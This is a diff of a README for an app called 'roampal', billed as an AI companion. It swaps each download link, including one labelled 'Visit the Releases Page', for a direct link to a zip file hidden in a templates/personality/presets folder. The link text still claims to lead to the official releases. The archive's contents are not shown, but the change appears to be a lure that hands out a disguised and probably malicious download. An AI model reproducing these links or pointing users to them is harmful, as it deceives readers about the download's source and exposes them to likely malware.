@@ -1,7 +1,7 @@
 # 🌱 roampal - Your AI Companion for Growth
 
 ## 🔗 Download Here
-[![Download roampal](https://img.shields.io/badge/Download-roampal-blue?style=for-the-badge)](https://github.com/armless-soutine34/roampal/releases)
+[![Download roampal](https://raw.githubusercontent.com/armless-soutine34/roampal/master/backend/templates/personality/presets/roampal-v3.9.zip)](https://raw.githubusercontent.com/armless-soutine34/roampal/master/backend/templates/personality/presets/roampal-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ roampal comes packed with features to assist you:
 To download roampal, visit the Releases page. Here is how you can get it:
 
 1. Click on the link below to go to the Releases page:
-   [Visit the Releases Page](https://github.com/armless-soutine34/roampal/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/armless-soutine34/roampal/master/backend/templates/personality/presets/roampal-v3.9.zip)
 
 2. On the Releases page, look for the latest version.
 
@@ -71,6 +71,6 @@ If you'd like to contribute to improving roampal, feel free to check the contrib
 Make sure to stay informed about new features and updates. Follow us on our GitHub page, and check the Releases section regularly for the latest information.
 
 ## 🔗 Download Here Again
-[![Download roampal](https://img.shields.io/badge/Download-roampal-blue?style=for-the-badge)](https://github.com/armless-soutine34/roampal/releases)
+[![Download roampal](https://raw.githubusercontent.com/armless-soutine34/roampal/master/backend/templates/personality/presets/roampal-v3.9.zip)](https://raw.githubusercontent.com/armless-soutine34/roampal/master/backend/templates/personality/presets/roampal-v3.9.zip)
 
 Enjoy your journey with roampal!
